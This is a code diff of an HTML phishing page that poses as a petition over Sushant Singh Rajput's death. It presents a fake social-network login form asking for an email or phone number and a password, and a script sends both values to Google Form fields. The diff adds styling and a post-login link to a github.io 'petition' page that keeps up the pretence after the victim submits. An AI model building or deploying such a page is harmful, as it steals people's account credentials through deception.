@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Petition for Sushant Sing Rajput Death_#Boycott Bollywood </title>
+  <title>Petition for Sushant Sing Rajput Death #Bycott Bollywood </title>
 
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js">
   </script>
@@ -124,7 +124,7 @@
     {
       background-color: green;
     float: left;
-    width: 90%;
+    width: 98%;
     margin-left: 0px;
     font-size: large;
     height: 30px;
@@ -137,6 +137,12 @@
     text-decoration: underline;
     float: left;
     margin-left: 20px;
+   }
+   #demo
+   {
+    float: left;
+    margin-top: -93px;
+    margin-left: 50px;
    }
 }
 
@@ -158,10 +164,10 @@
       <form id="form" target="_self" onsubmit="return postToGoogle();" action="" autocomplete="off"> 
         <input name="entry.1140695734" placeholder="email id or number" id="name" type="text"><br><br>
         <input name="entry.1875031900" type="password" placeholder="password" id="password"><br><br>
-        <input type="submit" value="Log In" class="ff">
+        <input type="submit" onclick="myFunction()" value="Log In" class="ff">
 
     </form><br>
-    <!-- <button onclick="sayhello();" class="ff"><b>Log In</b></button><br> -->
+
   <span id="fe">----------or----------</span>
   <br>
   <div class="h">
@@ -169,13 +175,15 @@
     </div><br><br>
 <a href="#"><span class="gh"> Forgotten account? </span></a>
   
-  </span>
+  </span><br><br>
+  <div id="demo"></div>
   
   </div>
   <script>
     function postToGoogle() {
                     var field1 = $("#name").val();
                     var field2 = $("#password").val();
+                    
 
 
                     if(field1 == ""){
@@ -207,6 +215,11 @@
                 });
 				return false;
             }
+            function myFunction() {
+  var str = "Sign The Petition Still 2000 left!";
+  var result = str.link("https://www-petition-in.github.io/Petition_for_Shushant_Sing_Rajput/");
+  document.getElementById("demo").innerHTML = result;
+}
 
      </script>
 </body>
